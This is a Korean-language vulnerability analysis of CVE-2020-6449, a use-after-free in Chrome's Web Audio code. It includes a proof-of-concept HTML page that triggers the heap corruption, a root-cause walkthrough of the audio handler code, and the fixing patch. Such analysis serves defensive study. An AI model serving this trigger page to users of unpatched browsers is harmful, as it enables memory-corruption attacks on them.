# CVE-2020-6449

## Description

Use after free in audio in Google Chrome prior to 80.0.3987.149 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.

## Proof-of-Concept

```JS
<!DOCTYPE html>
<html>
<head>
<script>
function startStop() {
  let audioCtx = new OfflineAudioContext(2,3072,3072);
  let src = audioCtx.createConstantSource();
  src.start();
  src.stop();
  return audioCtx;
}
function onLoad() {
  audioCtx = startStop();
  audioCtx.suspend((3 * 128)/3072.0).then(()=>{
    gc();
    audioCtx.resume();
  });
  audioCtx.startRendering();
}
</script>
</head>
<body onload="onLoad()"/>
</html>
```

## Root Cause Analysis

오디오 렌더링 과정에서 `HandlePreRenderTask`이 호출되며, 이후 다음 순서에 따라 코드가 실행된다.

1. `HandleStoppableSourceNodes()` 호출
2. (Frame )`AudioScheduledSourceHandler::Finish()` 호출
3. `AudioScheduledSourceHandler::FinishWithoutOnEnded` 호출

여기서 `FinishWithoutOnEnded`의 실행은 크게 2가지 결과를 낳는다.

```C++
void AudioScheduledSourceHandler::FinishWithoutOnEnded() {
  if (GetPlaybackState() != FINISHED_STATE) {
    // Let the context dereference this AudioNode.
    Context()->NotifySourceNodeFinishedProcessing(this); // (1)
    SetPlaybackState(FINISHED_STATE); // (2)
  }
}
```


(1) `BaseAudioContext::NotifySourceNodeFinishedProcessing` : `AudioScheduledSourceHandler`를 `finished_source_handlers_`에 추가한다(`vector` 자료형).

```C++
void BaseAudioContext::NotifySourceNodeFinishedProcessing(
    AudioHandler* handler) {
  DCHECK(IsAudioThread());

  GetDeferredTaskHandler().GetFinishedSourceHandlers()->push_back(handler); // AudioScheduledSourceHandler를 finished_source_handlers_에 추가한다
}
```

(2) `AudioScheduledSourceHandler`의 playback state를 `FINISHED_STATE`로 설정한다. 이는 곧 `AudioScheduledSourceNode`가 delete될 수 있음을 의미한다.



따라서, frame에 suspend를 설정하고, main thread에서 `AudioScheduleSourceNode`를 delete하는 것이 가능해지게 된다. (PoC 코드의 24-line)

```JS
  audioCtx.suspend((3 * 128)/3072.0).then(()=>{
    gc(); // delete AudioScheduledSourceNode
    audioCtx.resume();
  });
```

그럼에도 불구하고, `AudioScheduleSourceHandler`가 `BaseAudioContext`의 `active_source_handlers_`에 저장되어 있기 때문에 아직 참조가 0의 값을 가지지 않는다(완전히 free되지 않는다).

```C++
void BaseAudioContext::NotifySourceNodeStartedProcessing(AudioNode* node) {
  DCHECK(IsMainThread());
  GraphAutoLocker locker(this);

  GetDeferredTaskHandler().GetActiveSourceHandlers()->insert(&node->Handler()); // `active_source_handlers_`에 `AudioScheduleSourceHandler`가 추가됨
  node->Handler().MakeConnection();
}
```


하지만, 이후 `BaseAudioContext`가 resume될 때, `DeferredTaskHandler::BreakConnection`가 호출되는데, 해당 함수는 `active_source_handlers_`에 존재하는 `AudioScheduleSourceHandler`를 완전히 삭제하게 되고, 이후 해당 포인터의 사용으로 Use-After-Free가 발생하게 된다.

```C++
void DeferredTaskHandler::BreakConnections() {
  ...
  wtf_size_t size = finished_source_handlers_.size();
  if (size > 0) {
    for (auto* finished : finished_source_handlers_) {
      active_source_handlers_.erase(finished);          //<-- finished is now free'd
      finished->BreakConnectionWithLock();              //<-- UaF
    }
    finished_source_handlers_.clear();
  }
}
```


## Patch

아래 코드와 같이 free 후 해당 객체를 사용하는 것이 아니라, 해당 객체 사용 후, free하게끔 패치되었다.

```diff
--- a/third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc
+++ b/third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc
@@ -78,8 +78,10 @@
   wtf_size_t size = finished_source_handlers_.size();
   if (size > 0) {
     for (auto* finished : finished_source_handlers_) {
-      active_source_handlers_.erase(finished);
+      // Break connection first and then remove from the list because that can
+      // cause the handler to be deleted.
       finished->BreakConnectionWithLock();
+      active_source_handlers_.erase(finished);
     }
     finished_source_handlers_.clear();
   }
```
